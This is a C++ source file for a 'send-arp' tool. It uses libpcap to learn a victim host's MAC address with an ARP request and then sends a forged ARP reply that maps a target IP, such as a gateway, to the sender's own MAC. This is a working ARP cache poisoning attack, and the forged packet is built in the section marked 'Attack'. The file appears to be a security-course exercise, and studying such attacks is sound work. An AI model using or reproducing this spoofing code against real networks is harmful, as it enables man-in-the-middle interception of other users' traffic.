#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_LEN 6
#define IP_LEN 4

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp eth0 192.168.0.2 192.168.0.1\n");
}

void getMacAddress(uint8_t* uc_Mac, char* dev) {
   	int fd;
	
	struct ifreq ifr;
	char* iface = dev;
	char* mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);
	
	mac = (char*)ifr.ifr_hwaddr.sa_data;
	
	for (int i = 0; i < MAC_LEN; i++)
		uc_Mac[i] = mac[i];	
}

void getIpAddress(uint32_t &uc_Ip, char* dev) {
	int fd;
	
	struct ifreq ifr;
	char* iface = dev;
	char* ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	uint32_t tempIp[IP_LEN] = {0};

	ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    sscanf(ip, "%d.%d.%d.%d", &tempIp[0], &tempIp[1], &tempIp[2], &tempIp[3]);

	uc_Ip = (tempIp[0] << 24) | (tempIp[1] << 16) | (tempIp[2] << 8) | (tempIp[3]);
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char* senderIp = argv[2];
	char* targetIp = argv[3];
	Mac senderMac;
	uint8_t myMac[MAC_LEN] = {0};
	uint32_t myIp;

	// Get My Mac, Ip
	getMacAddress(myMac, dev);
	getIpAddress(myIp, dev);

	EthArpPacket packet;

	// Get Sender Mac
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(myMac);
	packet.arp_.sip_ = htonl(Ip(myIp));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(senderIp));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	EthArpPacket arpreply;
	const u_char* rpacket;
	struct pcap_pkthdr* header;
	res = pcap_next_ex(handle, &header, &rpacket);

	arpreply = *(EthArpPacket*)rpacket;
	senderMac = arpreply.eth_.smac_;

	// Attack
	packet.eth_.dmac_ = Mac(senderMac);
	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(myMac);
	packet.arp_.sip_ = htonl(Ip(targetIp));
	packet.arp_.tmac_ = Mac(senderMac);
	packet.arp_.tip_ = htonl(Ip(senderIp));

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
